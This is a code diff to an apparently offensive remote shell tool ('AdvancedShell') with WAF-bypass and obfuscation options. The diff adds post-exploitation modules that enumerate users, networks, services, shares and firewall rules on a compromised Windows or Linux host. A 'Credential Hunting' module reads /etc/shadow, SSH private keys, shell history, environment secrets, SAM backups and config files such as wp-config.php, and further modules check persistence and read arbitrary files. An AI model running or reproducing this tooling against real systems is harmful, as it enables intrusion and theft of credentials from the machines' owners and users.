@@ -495,6 +495,183 @@ class AdvancedShell:
         print(f"{Y}  Try: .rawtest id  |  .safeprobe  |  --exfil callback --callback-url URL{W}")
         return None
 
+    # ═══════════════════════════════════════════════════════
+    # POST-EXPLOITATION MODULES
+    # ═══════════════════════════════════════════════════════
+    def _run_enum(self,label,cmds):
+        """Run a list of (section, command) and print results."""
+        print(f"{Y}[*] {label}...{W}")
+        for section,cmd in cmds:
+            o=self.execute(cmd)
+            if o and '[-]' not in o and '[!' not in o:
+                lines=[x for x in o.strip().split('\n') if 'cannot find the path' not in x.lower()]
+                clean='\n'.join(lines).strip()
+                if clean:
+                    print(f"  {C}--- {section} ---{W}")
+                    for line in clean.split('\n')[:50]:print(f"  {line}")
+                    if len(clean.split('\n'))>50:print(f"  {DIM}... ({len(clean.split(chr(10)))} lines total){W}")
+            else:
+                print(f"  {C}{section}:{W} {R}failed{W}")
+
+    def post_users(self):
+        if self.target_os=='windows':
+            self._run_enum('User Enumeration',[
+                ('Current User','whoami /all'),
+                ('Local Users','net user'),
+                ('Administrators','net localgroup Administrators'),
+                ('Logged In','query user 2>nul || echo N/A'),
+            ])
+        else:
+            self._run_enum('User Enumeration',[
+                ('Current User','id'),
+                ('All Users','cat /etc/passwd | grep -v nologin | grep -v false'),
+                ('Sudo Privs','sudo -l 2>/dev/null || echo N/A'),
+                ('Logged In','w 2>/dev/null || who'),
+                ('Last Logins','last -n 10 2>/dev/null || echo N/A'),
+            ])
+
+    def post_ps(self):
+        if self.target_os=='windows':
+            self._run_enum('Process List',[
+                ('Processes','tasklist /FO TABLE /NH'),
+            ])
+        else:
+            self._run_enum('Process List',[
+                ('Processes','ps aux --sort=-%mem | head -30'),
+            ])
+
+    def post_net(self):
+        if self.target_os=='windows':
+            self._run_enum('Network Info',[
+                ('Interfaces','ipconfig /all'),
+                ('Connections','netstat -an | findstr ESTABLISHED'),
+                ('Listening','netstat -an | findstr LISTENING'),
+                ('ARP Table','arp -a'),
+                ('DNS Cache','ipconfig /displaydns | findstr "Record Name" 2>nul | head 20'),
+                ('Routes','route print'),
+            ])
+        else:
+            self._run_enum('Network Info',[
+                ('Interfaces','ip addr 2>/dev/null || ifconfig'),
+                ('Connections','ss -tunap 2>/dev/null || netstat -tunap 2>/dev/null'),
+                ('ARP','ip neigh 2>/dev/null || arp -a'),
+                ('Routes','ip route 2>/dev/null || route -n'),
+                ('DNS','cat /etc/resolv.conf'),
+                ('Hosts',"cat /etc/hosts | grep -v '^#' | grep -v '^$'"),
+            ])
+
+    def post_services(self):
+        if self.target_os=='windows':
+            self._run_enum('Services',[
+                ('Running Services','sc query state= running | findstr SERVICE_NAME'),
+                ('Startup Services','wmic service where StartMode="Auto" get Name,State /format:list 2>nul'),
+            ])
+        else:
+            self._run_enum('Services',[
+                ('Services','systemctl list-units --type=service --state=running 2>/dev/null || service --status-all 2>/dev/null'),
+                ('Listening','ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null'),
+            ])
+
+    def post_shares(self):
+        if self.target_os=='windows':
+            self._run_enum('Network Shares',[
+                ('Shares','net share'),
+                ('Mapped Drives','net use'),
+                ('Domain Info','net config workstation | findstr "domain" 2>nul'),
+            ])
+        else:
+            self._run_enum('Network Shares',[
+                ('NFS','showmount -e localhost 2>/dev/null || echo N/A'),
+                ('SMB','smbclient -L localhost -N 2>/dev/null || echo N/A'),
+                ('Mounts','mount | grep -v tmpfs'),
+            ])
+
+    def post_firewall(self):
+        if self.target_os=='windows':
+            self._run_enum('Firewall',[
+                ('Profile Status','netsh advfirewall show allprofiles state'),
+                ('Inbound Rules','netsh advfirewall firewall show rule name=all dir=in | findstr "Rule Name" | head 30'),
+            ])
+        else:
+            self._run_enum('Firewall',[
+                ('IPTables','iptables -L -n 2>/dev/null || echo N/A'),
+                ('UFW','ufw status 2>/dev/null || echo N/A'),
+            ])
+
+    def post_secrets(self):
+        if self.target_os=='windows':
+            self._run_enum('Credential Hunting',[
+                ('Env Secrets','set | findstr -i "pass key secret token api"'),
+                ('WiFi Profiles','netsh wlan show profiles 2>nul'),
+                ('Saved Creds','cmdkey /list 2>nul'),
+                ('SAM Backup','dir C:\\Windows\\repair\\SAM 2>nul & dir C:\\Windows\\System32\\config\\RegBack\\SAM 2>nul'),
+                ('Unattend','dir /s /b C:\\*unattend*.xml C:\\*sysprep*.xml C:\\*web.config 2>nul'),
+                ('.env Files','dir /s /b C:\\*.env 2>nul | head 20'),
+                ('Registry Secrets','reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall /s /f password 2>nul | head 20'),
+            ])
+        else:
+            self._run_enum('Credential Hunting',[
+                ('Env Secrets','env | grep -iE "pass|key|secret|token|api" 2>/dev/null'),
+                ('SSH Keys','ls -la ~/.ssh/ 2>/dev/null && cat ~/.ssh/id_* 2>/dev/null | head 5'),
+                ('History','cat ~/.bash_history 2>/dev/null | grep -iE "pass|key|secret|mysql|ssh" | tail -20'),
+                ('Config Files','find / -name "*.conf" -o -name ".env" -o -name "wp-config.php" -o -name "config.php" 2>/dev/null | head 20'),
+                ('/etc/shadow','cat /etc/shadow 2>/dev/null || echo Permission denied'),
+                ('DB Configs','grep -r "password" /etc/ --include="*.conf" 2>/dev/null | head 10'),
+            ])
+
+    def post_persist(self):
+        if self.target_os=='windows':
+            self._run_enum('Persistence Check',[
+                ('Scheduled Tasks','schtasks /query /fo TABLE /nh | findstr -v "INFO:" | head 30'),
+                ('Startup Registry','reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run 2>nul'),
+                ('User Startup','reg query HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run 2>nul'),
+                ('Startup Folder','dir "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup" 2>nul'),
+            ])
+        else:
+            self._run_enum('Persistence Check',[
+                ('Crontabs','crontab -l 2>/dev/null; ls -la /etc/cron* 2>/dev/null'),
+                ('Systemd Timers','systemctl list-timers 2>/dev/null'),
+                ('SUID Binaries','find / -perm -4000 -type f 2>/dev/null | head 20'),
+                ('World-Writable','find /etc /usr -writable -type f 2>/dev/null | head 10'),
+                ('Bashrc/Profile','cat ~/.bashrc ~/.profile 2>/dev/null | grep -v "^#" | grep -v "^$" | tail -20'),
+            ])
+
+    def post_software(self):
+        if self.target_os=='windows':
+            self._run_enum('Installed Software',[
+                ('Programs','wmic product get Name,Version /format:table 2>nul || reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall /s /v DisplayName 2>nul | findstr DisplayName | head 30'),
+                ('Patches','wmic qfe get HotFixID,InstalledOn /format:table 2>nul | head 20'),
+                ('.NET Version','reg query "HKLM\\SOFTWARE\\Microsoft\\NET Framework Setup\\NDP" /s /v Version 2>nul | findstr Version'),
+                ('Node.js','node -v 2>nul'),
+            ])
+        else:
+            self._run_enum('Installed Software',[
+                ('Packages','dpkg -l 2>/dev/null | tail -20 || rpm -qa 2>/dev/null | tail -20'),
+                ('Kernel','uname -r'),
+                ('Node.js','node -v 2>/dev/null'),
+                ('Python','python3 --version 2>/dev/null'),
+                ('Compilers','which gcc g++ cc make 2>/dev/null'),
+            ])
+
+    def post_cat(self,filepath):
+        """Read a file cross-platform."""
+        if self.target_os=='windows':
+            o=self.execute(f'type "{filepath}"')
+        else:
+            o=self.execute(f'cat "{filepath}"')
+        if o:print(o)
+        else:print(f"{R}Could not read file{W}")
+
+    def post_fullinfo(self):
+        """Comprehensive enumeration."""
+        self.post_users()
+        self.post_net()
+        self.post_ps()
+        self.post_services()
+        self.post_secrets()
+        self.post_persist()
+        self.post_software()
+
     def banner(self):
         print(f"""
 {BOLD}{C}╔══════════════════════════════════════════════════════════════╗
@@ -512,9 +689,17 @@ class AdvancedShell:
   {G}.obf{W} N            JS obfuscation 0-4     {G}.jsonesc{W} N       JSON escape 0-2
   {G}.bypass{W} [preset]  WAF bypass preset      {G}.debug{W}            Toggle debug
   {G}.timeout{W} N        Set timeout            {G}.status{W}           Show config
-  {G}.host{W} domain      Set Host header        {G}.info{W}             System enum
-  {G}.download{W} path    Download file          {G}.root{W}             Toggle sudo
-  {G}.save{W}             Save output            {G}.exit{W}             Exit
+  {G}.host{W} domain      Set Host header        {G}.download{W} path   Download file
+  {G}.root{W}             Toggle sudo            {G}.save{W}             Save output
+
+{BOLD}Post-Exploitation:{W}
+  {G}.info{W}             Quick system enum      {G}.fullinfo{W}         Full enum (all below)
+  {G}.users{W}            User enumeration       {G}.ps{W}               Process list
+  {G}.net{W}              Network info           {G}.services{W}         Running services
+  {G}.shares{W}           Network shares         {G}.firewall{W}         Firewall rules
+  {G}.secrets{W}          Credential hunting     {G}.persist{W}          Persistence check
+  {G}.software{W}         Installed software     {G}.cat{W} path         Read file
+  {G}.exit{W}             Exit
 """)
 
     def try_resolve_domain(self):
@@ -624,8 +809,8 @@ class AdvancedShell:
                         if out:self.last_output=out;print(out)
                     elif cmd.startswith('.rawtest'):
                         p=cmd.split(None,1);self.raw_test(p[1] if len(p)>1 else "echo TESTPING")
-                    elif cmd.startswith('.info'):
-                        print(f"{Y}[*] Enumerating...{W}")
+                    elif cmd.startswith('.info') and not cmd.startswith('.info '):
+                        print(f"{Y}[*] Quick Enumeration...{W}")
                         if self.target_os=='windows':
                             cmds=[("User","whoami"),("Host","hostname"),("OS","ver"),("IP","ipconfig | findstr IPv4"),("CWD","cd"),("Privs","whoami /priv | findstr Enabled"),("AV","wmic /namespace:\\\\root\\SecurityCenter2 path AntivirusProduct get displayName 2>nul || echo N/A")]
                         else:
@@ -633,12 +818,23 @@ class AdvancedShell:
                         for l,c in cmds:
                             o=self.execute(c)
                             if o and '[-]' not in o and '[!' not in o:
-                                # Clean up the cd/d error for Windows
                                 lines=[x for x in o.strip().split('\n') if 'cannot find the path' not in x.lower()]
                                 clean='\n'.join(lines).strip()
                                 if clean:print(f"  {C}{l}:{W} {clean}")
                                 else:print(f"  {C}{l}:{W} {R}failed{W}")
                             else:print(f"  {C}{l}:{W} {R}failed{W}")
+                    elif cmd=='.fullinfo':self.post_fullinfo()
+                    elif cmd=='.users':self.post_users()
+                    elif cmd=='.ps':self.post_ps()
+                    elif cmd=='.net':self.post_net()
+                    elif cmd=='.services':self.post_services()
+                    elif cmd=='.shares':self.post_shares()
+                    elif cmd=='.firewall':self.post_firewall()
+                    elif cmd=='.secrets':self.post_secrets()
+                    elif cmd=='.persist':self.post_persist()
+                    elif cmd=='.software':self.post_software()
+                    elif cmd.startswith('.cat '):
+                        p=cmd.split(' ',1);self.post_cat(p[1]) if len(p)>1 else print('Usage: .cat <filepath>')
                     elif cmd.startswith('.download') or cmd.startswith('.dl'):
                         p=cmd.split()
                         if len(p)<2:print("Usage: .download <remote> [local]");continue
